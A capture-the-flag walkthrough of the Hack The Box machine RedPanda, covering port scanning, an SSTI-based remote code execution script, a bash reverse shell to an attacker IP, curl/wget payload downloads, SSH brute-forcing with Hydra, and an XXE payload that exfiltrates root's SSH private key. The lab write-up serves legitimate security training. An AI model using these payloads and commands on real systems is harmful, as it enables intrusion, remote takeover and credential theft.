# RedPanda    
### A demonstration walkthrough of a pen test process using HTB's RedPanda with some normal dead ends as an example.  

#### Setup
/etc/hosts appended with "10.10.11.170 redpanda.htb"  
Firefox proxied via Zap, Zap proxied via Burp with intercept initially turned off  

Basic scan of all ports 
```
nmap -p- redpanda.htb
```
Shows ssh/22 and http/8080

The preferred way to scan.  A fast scan of all ports then a deeper scan for services on the found ports  
```
ports=$(nmap -p- --min-rate=1000 -T4  redpanda.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports redpanda.htb
nikto -h redpanda.htb:8080
```
Interesting Results (NMAP):  
- Running OpenSSH 8.2p1 and an unknown hhtp-proxy "Made by Spring Boot" in title  
Interesting Results (NIKTO):   
- /stats/ directory discovered
- HTTP PUT and DELETE methods allowed  
- "content-disposition" header returned    

Browse for unlinked files/resources  
```
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://redpanda.htb:8080/FUZZ | grep -wv 404 | grep 0000
```
POST allowed to redpanda.htb:8080/search
Confirm /stats/ responds to GET requests

**DEAD END:** Running OWASP ZAP only turned up vectors for attacking RedPanda clients.  
**DEAD END:** Browsing site showed nothing interesting in source.  
**DEAD END:**  Using Hydra to guess common username/passwords for SSH.  Trying a small set of default username and password combinations work more often in real world vs. simulations.  
```
echo 'root\nuser\nadmin\nadministrator\ndevelopment\ntest\nredpanda\napache\nwoodenk\ndamian' > redpanda.htb.usernames
echo 'password\nPassword\nPassw0rd\nPassw0rd!' > redpanda.htb.passwords
hydra -L redpanda.htb.usernames -P redpanda.htb.passwords -e nsr ssh://redpanda.htb
```

**DEAD END:**  Attempted various SQLi, XXE, and Command injection on search function

### SSTI
A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.  

See [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) for further information.

We are provided with a list of payloads:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
Some of the payloads didn't work, since some of the symbols (specifically $) are blacklisted by the server.

### Creating a RCE
The nmap scan indicated the app is powered by "Spring Boot"  
Not being familar with Spring Boot, a Google found this good template [here](https://blog.hawkeyesecurity.com/2017/12/13/rce-via-spring-engine-ssti/)  
This returns /etc/passwd

Replace the blacklisted $ with #
```
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
This confirms the user "woodenk" with the standard home directory; still no password.

Python program to convert the command we want into a string suitable for SSTI in RedPanda search
```
#!/usr/bin/python3

def main():

        command = "whoami" # Edit this line for acceptable SSTI encoding 
        convert = []

        for x in command:
            convert.append(str(ord(x)))
        
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % convert[0]

        for i in convert[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"

        print(payload)

if __name__ == "__main__":
    main()
```
`command = "whoami"` confirms the website is running as user woodenk
### USER FLAG SUCCESS!
`command = "cat /home/woodenk/user.txt"` provides the user flag

### Plan for escalation
Using SSTI: 1) Upload shell script to create reverse shell.  2) Invoke shell script

Host the following shell script on the attacking machine.  I prefer:  `python -m http.server 8000`
```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.ATTACKER.IP/9001 0>&1"
```
SSTI to upload script
`command = "curl 10.10.ATTACKER.IP:8000/shell.sh --output /tmp/shell.sh"`

Create netcat listener, then invoke uploaded shell script
`nc -nvlp 9001`

SSTI to invoke script
`command = "bash /tmp/shell.sh"`

### Connected with reverse shell as woodenk
Time for some basic enumeration on panda and woodenk
```
find / -name "*panda*" 2>/dev/null
find / -name "*woodenk*" 2>/dev/null
```

This gives us a source code directory (maybe some nice config info) and user XML files in /credits  

```
cd /opt/panda_search
find . -type f -exec grep -H 'text-to-find-here' {} \;
```

This gives mysql connection info and 'woodenk' embedded in some images  

`./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");`


Try LinPEAS to find escalation  
From github to your attacking machine (HTB machines don't resolve WWW domains)
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
```
On target machine upload linPEAS
```
curl -L http://10.10.14.2:8000/linpeas.sh | sh
```
**DEAD END** nothing I saw for OS level escalation  

### MySQL dump
```
mysqldump -u woodenk -pRedPandazRule red_panda 
```
This tells us the "panda" table has four fields (name, bio, imgloc, author)

ROOT requires XXE (this is just crib notes)
Full walkthrough [here](https://shakuganz.com/2022/07/12/hackthebox-redpanda/)

XXE.1 Set the "artist" value in an attack image
```
exiftool -Artist="../tmp/gg" pe_exploit.jpg
```

XXE.2 Create `gg_creds.xml` with the following content
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
  <author>gg</author>
  <image>
    <uri>/../../../../../../tmp/pe_exploit.jpg</uri>
    <views>1</views>
    <foo>&xxe;</foo>
  </image>
  <totalviews>2</totalviews>
</credits>
```

XXE.3 upload files and modify the redpanda.log
```
wget 10.10.ATTACKER.IP/pe_exploit.jpg -P /tmp
wget 10.10.ATTACKER.IP/gg_creds.jpg -P /tmp
echo "222||a||a||/../../../../../../tmp/pe_exploit.jpg" > /opt/panda_search/redpanda.log
```

In minute or two /tmp/gg_creds.xml is updated
```
cat /tmp/gg_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>gg</author>
  <image>
    <uri>/../../../../../../tmp/pe_exploit.jpg</uri>
    <views>2</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNza...cut...mVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
  <totalviews>3</totalviews>
</credits>
```

Put the `foo` element value into a file `le_key.txt` and login as root
```
chmod 600 ./le_key.txt
ssh root@redpanda.htb -i le_key.txt
```

### ROOT SUCCESS!
